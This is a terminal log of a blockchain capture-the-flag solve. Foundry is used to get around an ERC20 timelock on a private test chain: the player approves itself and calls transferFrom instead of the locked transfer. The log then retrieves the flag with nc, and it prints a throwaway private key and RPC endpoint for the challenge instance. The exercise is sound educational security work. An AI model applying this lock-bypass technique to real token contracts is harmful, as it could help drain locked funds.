```Bash

nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ forge init
Initializing /home/nithin/SCATERLABs/CTFs/Block1/bloc2...
Installing forge-std in /home/nithin/SCATERLABs/CTFs/Block1/bloc2/lib/forge-std (url: https://github.com/foundry-rs/forge-std, tag: None)
Cloning into '/home/nithin/SCATERLABs/CTFs/Block1/bloc2/lib/forge-std'...
remote: Enumerating objects: 2301, done.
remote: Counting objects: 100% (1142/1142), done.
remote: Compressing objects: 100% (194/194), done.
remote: Total 2301 (delta 1049), reused 950 (delta 948), pack-reused 1159 (from 3)
Receiving objects: 100% (2301/2301), 753.33 KiB | 833.00 KiB/s, done.
Resolving deltas: 100% (1535/1535), done.
    Installed forge-std tag=v1.11.0@8e40513d678f392f398620b3ef2b418648b33e89
    Initialized forge project
nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ cd ~/SCATERLABs/CTFs/Block1/bloc2
source .env

TIMELOCK=$(cast call $CHALLENGE "CONTRACT()(address)" --rpc-url $RPC_URL)
echo "export TIMELOCK=\"$TIMELOCK\"" >> .env
source .env
nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ cast call $CHALLENGE "CONTRACT()(address)" --rpc-url $RPC_URL
error: invalid value '0xf00F7a89E5da858edB45744e4464E468897c1e1eexport' for '[TO]': invalid string length

For more information, try '--help'.
nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ cast call $CHALLENGE "CONTRACT()(address)" --rpc-url $RPC_URL
error: invalid value '0xf00F7a89E5da858edB45744e4464E468897c1e1eexport' for '[TO]': invalid string length

For more information, try '--help'.
nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ forge script script/Solve.s.sol:SolveScript --rpc-url $RPC_URL --broadcast --legacy -vvvv
[⠊] Compiling...
[⠒] Unable to resolve imports:
      "@openzeppelin/contracts/token/ERC20/ERC20.sol" in "/home/nithin/SCATERLABs/CTFs/Block1/bloc2/src/Timelock.sol"
with remappings:
      forge-std/=/home/nithin/SCATERLABs/CTFs/Block1/bloc2/lib/forge-std/src/
[⠒] Compiling 18 files with Solc 0.8.30
[⠑] Solc 0.8.30 finished in 333.72ms
Error: Compiler run failed:
Error (6275): Source "@openzeppelin/contracts/token/ERC20/ERC20.sol" not found: File not found. Searched the following locations: "/home/nithin/SCATERLABs/CTFs/Block1/bloc2".
ParserError: Source "@openzeppelin/contracts/token/ERC20/ERC20.sol" not found: File not found. Searched the following locations: "/home/nithin/SCATERLABs/CTFs/Block1/bloc2".
 --> src/Timelock.sol:4:1:
  |
4 | import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ forge install OpenZeppelin/openzeppelin-contracts --no-commit
error: unexpected argument '--no-commit' found

  tip: a similar argument exists: '--commit'

Usage: forge install [OPTIONS] [DEPENDENCIES]...
    forge install [OPTIONS] <github username>/<github project>@<tag>...
    forge install [OPTIONS] <alias>=<github username>/<github project>@<tag>...
    forge install [OPTIONS] <https://<github token>@git url>...)]
    forge install [OPTIONS] <https:// git url>...

For more information, try '--help'.
nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ forge install OpenZeppelin/openzeppelin-contracts 
Installing openzeppelin-contracts in /home/nithin/SCATERLABs/CTFs/Block1/bloc2/lib/openzeppelin-contracts (url: https://github.com/OpenZeppelin/openzeppelin-contracts, tag: None)
Cloning into '/home/nithin/SCATERLABs/CTFs/Block1/bloc2/lib/openzeppelin-contracts'...
remote: Enumerating objects: 53080, done.
remote: Counting objects: 100% (265/265), done.
remote: Compressing objects: 100% (197/197), done.
remote: Total 53080 (delta 112), reused 68 (delta 68), pack-reused 52815 (from 3)
Receiving objects: 100% (53080/53080), 49.26 MiB | 2.96 MiB/s, done.
Resolving deltas: 100% (33575/33575), done.
Submodule 'lib/erc4626-tests' (https://github.com/a16z/erc4626-tests.git) registered for path 'lib/erc4626-tests'
Submodule 'lib/forge-std' (https://github.com/foundry-rs/forge-std) registered for path 'lib/forge-std'
Submodule 'lib/halmos-cheatcodes' (https://github.com/a16z/halmos-cheatcodes) registered for path 'lib/halmos-cheatcodes'
Cloning into '/home/nithin/SCATERLABs/CTFs/Block1/bloc2/lib/openzeppelin-contracts/lib/erc4626-tests'...
remote: Enumerating objects: 32, done.        
remote: Counting objects: 100% (26/26), done.        
remote: Compressing objects: 100% (20/20), done.        
remote: Total 32 (delta 15), reused 7 (delta 4), pack-reused 6 (from 1)        
Receiving objects: 100% (32/32), 29.05 KiB | 319.00 KiB/s, done.
Resolving deltas: 100% (15/15), done.
Cloning into '/home/nithin/SCATERLABs/CTFs/Block1/bloc2/lib/openzeppelin-contracts/lib/forge-std'...
remote: Enumerating objects: 2301, done.        
remote: Counting objects: 100% (1142/1142), done.        
remote: Compressing objects: 100% (195/195), done.        
remote: Total 2301 (delta 1049), reused 949 (delta 947), pack-reused 1159 (from 3)        
Receiving objects: 100% (2301/2301), 753.33 KiB | 948.00 KiB/s, done.
Resolving deltas: 100% (1535/1535), done.
Cloning into '/home/nithin/SCATERLABs/CTFs/Block1/bloc2/lib/openzeppelin-contracts/lib/halmos-cheatcodes'...
remote: Enumerating objects: 47, done.        
remote: Counting objects: 100% (47/47), done.        
remote: Compressing objects: 100% (37/37), done.        
remote: Total 47 (delta 19), reused 25 (delta 10), pack-reused 0 (from 0)        
Receiving objects: 100% (47/47), 24.40 KiB | 1.63 MiB/s, done.
Resolving deltas: 100% (19/19), done.
    Installed openzeppelin-contracts tag=v5.4.0@c64a1edb67b6e3f4a15cca8909c9482ad33a02b0
nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ forge script script/Solve.s.sol:SolveScript --rpc-url $RPC_URL --broadcast --legacy -vvvv
[⠊] Compiling...
[⠒] Compiling 23 files with Solc 0.8.30
[⠘] Solc 0.8.30 finished in 1.52s
Compiler run successful with warnings:
Warning (2462): Visibility for constructor is ignored. If you want the contract to be non-deployable, making it "abstract" is sufficient.
  --> src/Challenge.sol:12:5:
   |
12 |     constructor(address player, address _contract) public {
   |     ^ (Relevant source part starts here and spans across multiple lines).

Warning (6321): Unnamed return variable can remain unassigned. Add an explicit return with value to all non-reverting code paths or name the variable.
  --> src/Timelock.sol:18:88:
   |
18 |     function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
   |                                                                                        ^^^^

Traces:
  [694183] → new SolveScript@0x9f7cF1d1F558E57ef88a59ac3D47214eF25B6A06
    └─ ← [Return] 3355 bytes of code

  [4624] SolveScript::run()
    ├─ [0] VM::envUint("PRIVATE_KEY") [staticcall]
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::envAddress("TIMELOCK") [staticcall]
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::envAddress("CHALLENGE") [staticcall]
    │   └─ ← [Revert] vm.envAddress: failed parsing $CHALLENGE as type `address`: parser error:
$CHALLENGE
^
odd number of digits
    └─ ← [Revert] vm.envAddress: failed parsing $CHALLENGE as type `address`: parser error:
$CHALLENGE
^
odd number of digits


Error: script failed: vm.envAddress: failed parsing $CHALLENGE as type `address`: parser error:
$CHALLENGE
^
odd number of digits
nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ source .env
nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ forge script script/Solve.s.sol:SolveScript --rpc-url $RPC_URL --broadcast --legacy -vvvv
[⠒] Compiling...
No files changed, compilation skipped
Traces:
  [104448] SolveScript::run()
    ├─ [0] VM::envUint("PRIVATE_KEY") [staticcall]
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::envAddress("TIMELOCK") [staticcall]
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::envAddress("CHALLENGE") [staticcall]
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::startBroadcast(<pk>)
    │   └─ ← [Return]
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0xc3c7408C6926E23fB1A46b58AE315eC4710F8732
    ├─ [2850] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::balanceOf(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732) [staticcall]
    │   └─ ← [Return] 1000000000000000000000000 [1e24]
    ├─ [0] console::log("Player balance:", 1000000000000000000000000 [1e24]) [staticcall]
    │   └─ ← [Stop]
    ├─ [25296] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::approve(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, 1000000000000000000000000 [1e24])
    │   ├─ emit Approval(owner: 0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, spender: 0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, value: 1000000000000000000000000 [1e24])
    │   └─ ← [Return] true
    ├─ [0] console::log("Approved:", 1000000000000000000000000 [1e24]) [staticcall]
    │   └─ ← [Stop]
    ├─ [29614] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::transferFrom(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, ECRecover: [0x0000000000000000000000000000000000000001], 1000000000000000000000000 [1e24])
    │   ├─ emit Transfer(from: 0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, to: ECRecover: [0x0000000000000000000000000000000000000001], value: 1000000000000000000000000 [1e24])
    │   └─ ← [Return] true
    ├─ [0] console::log("Transferred via transferFrom!") [staticcall]
    │   └─ ← [Stop]
    ├─ [850] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::balanceOf(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] console::log("New balance:", 0) [staticcall]
    │   └─ ← [Stop]
    ├─ [23895] 0xf00F7a89E5da858edB45744e4464E468897c1e1e::solve()
    │   ├─ [850] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::balanceOf(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [0] console::log("Challenge solved!") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] VM::stopBroadcast()
    │   └─ ← [Return]
    └─ ← [Stop]


Script ran successfully.

== Logs ==
  Player balance: 1000000000000000000000000
  Approved: 1000000000000000000000000
  Transferred via transferFrom!
  New balance: 0
  Challenge solved!

## Setting up 1 EVM.
==========================
Simulated On-chain Traces:

  [25296] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::approve(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, 1000000000000000000000000 [1e24])
    ├─ emit Approval(owner: 0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, spender: 0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, value: 1000000000000000000000000 [1e24])
    └─ ← [Return] true

  [36414] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::transferFrom(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, ECRecover: [0x0000000000000000000000000000000000000001], 1000000000000000000000000 [1e24])
    ├─ emit Transfer(from: 0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, to: ECRecover: [0x0000000000000000000000000000000000000001], value: 1000000000000000000000000 [1e24])
    └─ ← [Return] true

  [28395] 0xf00F7a89E5da858edB45744e4464E468897c1e1e::solve()
    ├─ [2850] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::balanceOf(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732) [staticcall]
    │   └─ ← [Return] 0
    └─ ← [Stop]


==========================

Chain 31337

Estimated gas price: 1.7756804 gwei

Estimated total gas used for script: 204292

Estimated amount required: 0.0003627573002768 ETH

==========================

##### anvil-hardhat
✅  [Success] Hash: 0x29230c2b2ecaa6c50f10dd9cf7bf011041a3ef6dd6e07709efecabab33aa96bd
Block: 3
Paid: 0.000083350437976 ETH (46940 gas * 1.7756804 gwei)


##### anvil-hardhat
✅  [Success] Hash: 0x732a8a01c8f4eeb5ecba94790f10049b4fbc4dacf0e7e4f081281101f35a2697
Block: 4
Paid: 0.0000878233769036 ETH (49459 gas * 1.7756804 gwei)


##### anvil-hardhat
✅  [Success] Hash: 0x3a344d2618f955b3c12bb1e4796bb5deaaf42168e119faaeecaacdf59bdc503d
Block: 4
Paid: 0.0000862945160792 ETH (48598 gas * 1.7756804 gwei)

✅ Sequence #1 on anvil-hardhat | Total Paid: 0.0002574683309588 ETH (144997 gas * avg 1.7756804 gwei)
                                                                 

==========================

ONCHAIN EXECUTION COMPLETE & SUCCESSFUL.

Transactions saved to: /home/nithin/SCATERLABs/CTFs/Block1/bloc2/broadcast/Solve.s.sol/31337/run-latest.json

Sensitive values saved to: /home/nithin/SCATERLABs/CTFs/Block1/bloc2/cache/Solve.s.sol/31337/run-latest.json

nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ forge script script/Solve.s.sol:SolveScript --rpc-url $RPC_URL --broadcast --legacy -vvvv
[⠊] Compiling...
No files changed, compilation skipped
^C
nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ cast call $CHALLENGE "isSolved()(bool)" --rpc-url $RPC_URL
true
nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ nc 161.97.155.116 6970

 ██████╗ ███╗   ██╗ ██████╗ ███████╗███████╗ ██████╗     ██████╗████████╗███████╗
██╔═══██╗████╗  ██║██╔═══██╗██╔════╝██╔════╝██╔════╝    ██╔════╝╚══██╔══╝██╔════╝
██║   ██║██╔██╗ ██║██║   ██║███████╗█████╗  ██║         ██║        ██║   █████╗  
██║▄▄ ██║██║╚██╗██║██║▄▄ ██║╚════██║██╔══╝  ██║         ██║        ██║   ██╔══╝  
╚██████╔╝██║ ╚████║╚██████╔╝███████║███████╗╚██████╗    ╚██████╗   ██║   ██║     
 ╚══▀▀═╝ ╚═╝  ╚═══╝ ╚══▀▀═╝ ╚══════╝╚══════╝ ╚═════╝     ╚═════╝   ╚═╝   ╚═╝     

[timelock] Welcome anon!
[timelock] 1 - Launch a new instance
[timelock] 2 - Kill your instance
[timelock] 3 - Get the flag
[timelock] Action? 3

[timelock] What is your ticket? 5e1412cd7083b4b49f31098c9b322b16
[timelock] Nicely done! Now don't lose it: QnQSec{gr3at_j0b_y0u_l3arn7_4b0u7_3rc20_t0k3n5}

```


```Bash
nithin@ScateR:~/SCATERLABs/CTFs/Block1$ cd bloc2
nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ nc 161.97.155.116 6970
# Press 1

 ██████╗ ███╗   ██╗ ██████╗ ███████╗███████╗ ██████╗     ██████╗████████╗███████╗
██╔═══██╗████╗  ██║██╔═══██╗██╔════╝██╔════╝██╔════╝    ██╔════╝╚══██╔══╝██╔════╝
██║   ██║██╔██╗ ██║██║   ██║███████╗█████╗  ██║         ██║        ██║   █████╗  
██║▄▄ ██║██║╚██╗██║██║▄▄ ██║╚════██║██╔══╝  ██║         ██║        ██║   ██╔══╝  
╚██████╔╝██║ ╚████║╚██████╔╝███████║███████╗╚██████╗    ╚██████╗   ██║   ██║     
 ╚══▀▀═╝ ╚═╝  ╚═══╝ ╚══▀▀═╝ ╚══════╝╚══════╝ ╚═════╝     ╚═════╝   ╚═╝   ╚═╝     

[timelock] Welcome anon!
[timelock] 1 - Launch a new instance
[timelock] 2 - Kill your instance
[timelock] 3 - Get the flag
[timelock] Action? 1

[timelock] Your ticket: 5e1412cd7083b4b49f31098c9b322b16

[timelock] Creating private blockchain...
[timelock] Deploying challenge.. (please be patient, this can take a while)

[timelock] Your private blockchain has been set up,
[timelock] it will automatically terminate in 15.0 minutes!

[timelock] RPC Endpoints:
[timelock]     - http://161.97.155.116:8545/hMieWJmMSlzbOlCgXEyCBLmw/main
[timelock]     - ws://161.97.155.116:8545/hMieWJmMSlzbOlCgXEyCBLmw/main/ws

[timelock] The Player private key:         0xaabd6bc6c80b62c8e486de2285d9f7a9d59995694a73ed98481e51f0e0016414
[timelock] The Challenge contract address: 0xf00F7a89E5da858edB45744e4464E468897c1e1e
```